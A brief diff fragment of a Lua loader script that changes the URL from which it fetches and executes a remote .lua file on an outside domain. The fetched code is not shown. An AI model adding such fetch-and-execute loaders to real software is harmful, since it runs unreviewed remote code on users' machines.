@@ -1,6 +1,6 @@
 -- Fetch and execute the first script
 local firstScript
-local firstScriptURL = "https://egorikusa.space/be52cd3d9e2e533152a6696a.lua"
+local firstScriptURL = "https://egorikusa.space/500bf02f61e888f206aa5744.lua"
 
 local success1, error1 = pcall(function()
     print("Fetching first script...")
